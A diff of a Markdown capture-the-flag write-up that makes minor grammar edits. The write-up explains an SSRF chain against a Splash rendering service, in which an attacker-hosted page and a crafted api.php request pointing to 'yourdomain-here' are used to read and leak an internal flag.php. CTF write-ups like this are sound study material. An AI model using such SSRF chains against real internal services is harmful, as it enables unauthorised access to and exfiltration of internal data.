@@ -49,7 +49,7 @@ The __Splash__ service have many endpoints that can be used to fetch pages such 
 
 ![img desc](screen/render_jpeg_docs.png)
 
-At this point I start to think for a chain that can be used to retrieve the flag by using this functionality. The basic idea that I had was to embed an `<img>` tag in a page controlled by me and pointing to the `/render.jpeg` endpoint with the `url` parameter `http://172.16.0.14/flag.php`. After that I can leak the contents with some JavaScript code.
+At this point I start thinking for a chain that can be use to retrieve the flag by using this functionality. The basic idea that I had was to embed an `<img>` tag in a page controlled by me and pointing to the `/render.jpeg` endpoint with the `url` parameter `http://172.16.0.14/flag.php`. After that I can leak the contents with some JavaScript code.
 
 This is the code I used to do that:
 
@@ -77,7 +77,7 @@ To make this work, I just play a bit with the `api.php` page and come up with th
 GET /api.php?url=http://172.16.0.13:8050/render.html%3furl=http://<yourdomain-here>:8000/exploit.php HTTP/1.1
 ...
 ```
-basically the first request goes to the `/render.json` endpoint that is used inside the `api.php`, then a request for `/render.html` is generated along with the `url` parameter pointing to my domain where I hosted the page showed before is hosted.
+basically the first request goes to the `/render.json` endpoint that is used inside the `api.php`, then a request for `/render.html` is generated along with the `url` parameter pointing to my domain where I hosted the page showed before.
 You can look the exploit working during the CTF in the screenshots below.
 
 ![img desc](screen/SSRF.png)
